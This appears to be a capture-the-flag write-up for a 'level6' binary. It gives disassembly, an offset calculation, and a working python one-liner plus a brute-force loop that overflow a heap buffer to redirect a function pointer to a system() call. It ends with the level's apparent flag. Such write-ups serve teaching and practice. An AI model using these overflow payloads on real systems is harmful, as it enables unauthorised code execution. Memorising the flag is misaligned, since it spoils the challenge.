int32_t main(int32_t argc, char** argv, char** envp)

0804848c  int32_t eax = malloc(64)
0804849c  int32_t* eax_1 = malloc(4)
080484ae  *eax_1 = 0x8048468
080484c5  strcpy(eax, *(argv + 4))   ## strcpy()
080484d3  return *eax_1()

(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave  
   0x08048467 <+19>:    ret 

0x08048454 is our desired address

/-------------------------------------------------/
Calculate the offset:
https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

the program uses the first argument and malloc's it on a 64-size buffer.
The offset is at 72 bytes.

lets smash the stack with it :D 

python -c 'print "A"*72 + "\x54\x84\x04\x08"' > /dev/shm/exp ; ./level6 `cat /dev/shm/exp`

/-------------------------------------------------/
bonus: bruteforcing without knowing the offset:
for i in {1..100}; do python -c "print \"\\x54\\x84\\x04\\x08\"*$i" > /dev/shm/exp ;  ./level6 `cat /dev/shm/exp`; done
/-------------------------------------------------/

f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d